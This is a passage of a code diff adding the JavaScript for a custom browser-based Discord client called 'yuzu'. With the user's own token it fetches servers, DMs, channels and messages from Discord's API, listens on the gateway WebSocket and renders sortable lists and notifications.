+        username.textContent = yuzuGetDisplayName(user);
+        profile.classList.remove('hidden');
+      }
+    }
+
+    async function yuzuLoadGuilds() {
+      if (!yuzuToken) return;
+      
+      try {
+        const response = await fetch('https://discord.com/api/v9/users/@me/guilds', {
+          headers: { Authorization: yuzuToken }
+        });
+        
+        if (response.ok) {
+          yuzuGuildsData = await response.json();
+          yuzuDisplayGuilds();
+        }
+      } catch (error) {
+        console.error('Erreur lors du chargement des serveurs:', error);
+      }
+    }
+
+    async function yuzuLoadDMs() {
+      if (!yuzuToken) return;
+      
+      try {
+        const response = await fetch('https://discord.com/api/v9/users/@me/channels', {
+          headers: { Authorization: yuzuToken }
+        });
+        
+        if (response.ok) {
+          yuzuDmsData = await response.json();
+          yuzuDisplayDMs();
+        }
+      } catch (error) {
+        console.error('Erreur lors du chargement des DMs:', error);
+      }
+    }
+
+    function yuzuDisplayGuilds() {
+      const list = document.getElementById('guildList');
+      list.innerHTML = '';
+      
+      yuzuGuildsData.forEach(guild => {
+        const li = document.createElement('li');
+        li.className = 'server-item';
+        li.onclick = () => yuzuLoadChannels(guild.id, guild.name);
+        
+        const avatar = document.createElement('div');
+        avatar.className = 'server-avatar';
+        if (guild.icon) {
+          const img = document.createElement('img');
+          img.src = `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png?size=32`;
+          img.alt = guild.name;
+          avatar.appendChild(img);
+        } else {
+          avatar.textContent = guild.name.charAt(0).toUpperCase();
+        }
+        
+        const name = document.createElement('div');
+        name.className = 'server-name';
+        name.textContent = guild.name;
+        
+        li.appendChild(avatar);
+        li.appendChild(name);
+        list.appendChild(li);
+      });
+    }
+
+    function yuzuDisplayDMs() {
+      const list = document.getElementById('dmList');
+      list.innerHTML = '';
+      
+      yuzuDmsData.forEach(dm => {
+        const li = document.createElement('li');
+        li.className = 'dm-item';
+        li.setAttribute('data-channel-id', dm.id);
+        
+        let displayName = 'DM';
+        if (dm.type === 1 && dm.recipients && dm.recipients.length > 0) {
+          displayName = yuzuGetDisplayName(dm.recipients[0]);
+        } else if (dm.type === 3) {
+          displayName = dm.name || 'Groupe';
+        }
+        
+        li.onclick = () => yuzuOpenChannel(dm.id, displayName);
+        
+        const avatar = document.createElement('div');
+        avatar.className = 'dm-avatar';
+        
+        if (dm.type === 1 && dm.recipients && dm.recipients.length > 0) {
+          const avatarUrl = yuzuGetAvatarUrl(dm.recipients[0]);
+          if (avatarUrl) {
+            const img = document.createElement('img');
+            img.src = avatarUrl;
+            img.alt = displayName;
+            avatar.appendChild(img);
+          } else {
+            avatar.textContent = displayName.charAt(0).toUpperCase();
+          }
+        } else {
+          avatar.textContent = displayName.charAt(0).toUpperCase();
+        }
+        
+        const name = document.createElement('div');
+        name.className = 'dm-name';
+        name.textContent = displayName;
+        
+        li.appendChild(avatar);
+        li.appendChild(name);
+        list.appendChild(li);
+      });
+    }
+
+    async function yuzuLoadChannels(guildId, guildName) {
+      if (!yuzuToken) return;
+      
+      try {
+        const response = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
+          headers: { Authorization: yuzuToken }
+        });
+        
+        if (response.ok) {
+          const channels = await response.json();
+          yuzuDisplayChannels(channels, guildName);
+        }
+      } catch (error) {
+        console.error('Erreur lors du chargement des salons:', error);
+      }
+    }
+
+    function yuzuDisplayChannels(channels, guildName) {
+      const sidebar = document.getElementById('channelSidebar');
+      const list = document.getElementById('channelList');
+      const header = document.getElementById('currentGuildName');
+      
+      header.textContent = guildName;
+      list.innerHTML = '';
+      
+      const textChannels = channels.filter(c => c.type === 0).sort((a, b) => a.position - b.position);
+      
+      textChannels.forEach(channel => {
+        const li = document.createElement('li');
+        li.className = 'channel-item';
+        li.onclick = () => yuzuOpenChannel(channel.id, channel.name);
+        
+        const hash = document.createElement('span');
+        hash.className = 'channel-hash';
+        hash.textContent = '#';
+        
+        const name = document.createElement('span');
+        name.className = 'channel-name';
+        name.textContent = channel.name;
+        
+        li.appendChild(hash);
+        li.appendChild(name);
+        list.appendChild(li);
+      });
+      
+      sidebar.classList.remove('hidden');
+    }
+
+    async function yuzuOpenChannel(channelId, channelName) {
+      yuzuCurrentChannelId = channelId;
+      document.getElementById('chatTitle').textContent = `# ${channelName}`;
+      document.getElementById('chat').innerHTML = '';
+      
+      yuzuUpdateNotificationBadge(channelId, false);
+      
+      await yuzuLoadMessages(channelId);
+      
+      if (yuzuSocket) yuzuSocket.close();
+      yuzuSocket = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
+
+      yuzuSocket.onopen = () => {
+        yuzuSocket.send(JSON.stringify({
+          op: 2,
+          d: {
+            token: yuzuToken,
+            intents: 32767,
+            properties: {
+              os: 'linux', browser: 'yuzu', device: 'yuzu'
+            }
+          }
+        }));
+      };
+
+      yuzuSocket.onmessage = ({ data }) => {
+        try {
+          const payload = JSON.parse(data);
+          if (payload.t === 'MESSAGE_CREATE') {
+            const msg = payload.d;
+            
+            if (msg.channel_id === yuzuCurrentChannelId && msg.author.id !== yuzuUserId) {
+              yuzuAppendMessage(msg.author, msg.content);
+            }
+            
+            if (msg.author.id !== yuzuUserId) {
+              const isDM = yuzuDmsData.some(dm => dm.id === msg.channel_id && (dm.type === 1 || dm.type === 3));
+              
+              if (isDM && msg.channel_id !== yuzuCurrentChannelId) {
+                yuzuCreateNotification(msg.author, msg.content, msg.channel_id);
+                yuzuUpdateNotificationBadge(msg.channel_id, true);
+              }
+            }
+            
+            yuzuUpdateLastMessageCache(msg.channel_id, msg);
+          }
+        } catch (error) {
+          console.error('Erreur lors du traitement du message WebSocket:', error);
+        }
+      };
+
+      yuzuSocket.onerror = (error) => {
+        console.error('Erreur WebSocket:', error);
+      };
+    }
+
+    async function yuzuLoadMessages(channelId) {
+      if (!yuzuToken) return;
+      
+      try {
+        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages?limit=50`, {
+          headers: { Authorization: yuzuToken }
+        });
+        
+        if (response.ok) {
+          const messages = await response.json();
+          messages.reverse().forEach(msg => {
+            yuzuAppendMessage(msg.author, msg.content);
+          });
+        }
+      } catch (error) {
+        console.error('Erreur lors du chargement des messages:', error);
+      }
+    }
+
+    function yuzuUpdateLastMessageCache(channelId, message) {
+      yuzuLastMessageCache.set(channelId, message);
+    }
+
+    function yuzuSortGuilds() {
+      const sortBy = document.getElementById('guildSort').value;
+      
+      switch(sortBy) {
+        case 'name':
+          yuzuGuildsData.sort((a, b) => a.name.localeCompare(b.name));
+          break;
+        case 'members':
+          yuzuGuildsData.sort((a, b) => (b.approximate_member_count || 0) - (a.approximate_member_count || 0));
+          break;
+        case 'recent':
+          yuzuGuildsData.sort((a, b) => {
+            const lastA = yuzuLastMessageCache.get(a.id);
+            const lastB = yuzuLastMessageCache.get(b.id);
+            if (!lastA && !lastB) return 0;
+            if (!lastA) return 1;
+            if (!lastB) return -1;
+            return new Date(lastB.timestamp) - new Date(lastA.timestamp);
+          });
+          break;
+      }
+      yuzuDisplayGuilds();
+    }
+
+    function yuzuSortDMs() {
+      const sortBy = document.getElementById('dmSort').value;
+      
+      switch(sortBy) {
+        case 'name':
+          yuzuDmsData.sort((a, b) => {
+            const nameA = a.type === 1 && a.recipients ? yuzuGetDisplayName(a.recipients[0]) : (a.name || 'Groupe');
+            const nameB = b.type === 1 && b.recipients ? yuzuGetDisplayName(b.recipients[0]) : (b.name || 'Groupe');
+            return nameA.localeCompare(nameB);
+          });
+          break;
+        case 'recent':
+          yuzuDmsData.sort((a, b) => {
+            const lastA = yuzuLastMessageCache.get(a.id);
+            const lastB = yuzuLastMessageCache.get(b.id);
+            if (!lastA && !lastB) return 0;
+            if (!lastA) return 1;
+            if (!lastB) return -1;
+            return new Date(lastB.timestamp) - new Date(lastA.timestamp);
+          });
+          break;
+        case 'unread':
+          yuzuDmsData.sort((a, b) => {
+            const countA = yuzuNotificationCounts.get(a.id) || 0;
+            const countB = yuzuNotificationCounts.get(b.id) || 0;
+            return countB - countA;
+          });
+          break;
+      }
+      yuzuDisplayDMs();
+    }
+
+    function yuzuToggleSection(sectionId, headerElement) {
+      const section = document.getElementById(sectionId);
+      const arrow = headerElement.querySelector('.group-arrow');
+      
+      if (section.style.display === 'none') {
+        section.style.display = 'block';
+        arrow.textContent = '▼';
+      } else {
+        section.style.display = 'none';
+        arrow.textContent = '▶';
+      }
+    }
+
+    function yuzuRefreshData() {
+      const btn = document.querySelector('.refresh-btn .btn-icon');
+      btn.classList.add('rotating');
+      
+      Promise.all([yuzuLoadGuilds(), yuzuLoadDMs()]).finally(() => {
+        setTimeout(() => {
+          btn.classList.remove('rotating');
+        }, 1000);
+      });
     }
   </script>
 </body>
